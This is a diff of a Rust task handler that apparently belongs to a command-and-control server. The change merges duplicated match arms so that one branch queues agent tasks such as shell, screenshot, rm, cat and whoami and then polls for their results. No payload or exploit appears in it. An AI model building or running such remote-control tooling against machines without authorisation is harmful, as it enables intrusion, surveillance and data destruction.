@@ -26,87 +26,8 @@ pub async fn handle_task(
     let max_check_cnt: u8 = 10;
 
     match args[2].as_str() {
-        "cd" => {
-            match set_task(&args) {
-                Ok(_) => {},
-                Err(e) => {
-                    let _ = socket_lock.send(
-                        Message::Text(
-                            format!("[task:error] Could not set the task: {}", e.to_string())
-                        )).await;
-                    let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
-                    return;
-                }
-            }
-
-            check_task_result(
-                socket_lock,
-                ag_name.to_string(),
-                check_sleeptime,
-                max_check_cnt,
-            ).await;
-        }
-        "ls" => {
-            match set_task(&args) {
-                Ok(_) => {},
-                Err(e) => {
-                    let _ = socket_lock.send(
-                        Message::Text(
-                            format!("[task:error] Could not set the task: {}", e.to_string())
-                        )).await;
-                    let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
-                    return;
-                }
-            }
-
-            check_task_result(
-                socket_lock,
-                ag_name.to_string(),
-                check_sleeptime,
-                max_check_cnt,
-            ).await;
-        }
-        "pwd" => {
-            match set_task(&args) {
-                Ok(_) => {},
-                Err(e) => {
-                    let _ = socket_lock.send(
-                        Message::Text(
-                            format!("[task:error] Could not set the task: {}", e.to_string())
-                        )).await;
-                    let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
-                    return;
-                }
-            }
-
-            check_task_result(
-                socket_lock,
-                ag_name.to_string(),
-                check_sleeptime,
-                max_check_cnt,
-            ).await;
-        }
-        "screenshot" => {
-            match set_task(&args) {
-                Ok(_) => {},
-                Err(e) => {
-                    let _ = socket_lock.send(
-                        Message::Text(
-                            format!("[task:error] Could not set the task: {}", e.to_string())
-                        )).await;
-                    let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
-                    return;
-                }
-            }
-
-            check_task_result(
-                socket_lock,
-                ag_name.to_string(),
-                check_sleeptime,
-                max_check_cnt,
-            ).await;
-        }
-        "shell" => {
+        "cat" | "cd" | "info" | "ls" | "pwd" | "rm" | "screenshot" |
+        "shell" | "sleep" | "whoami" => {
             match set_task(&args) {
                 Ok(_) => {},
                 Err(e) => {
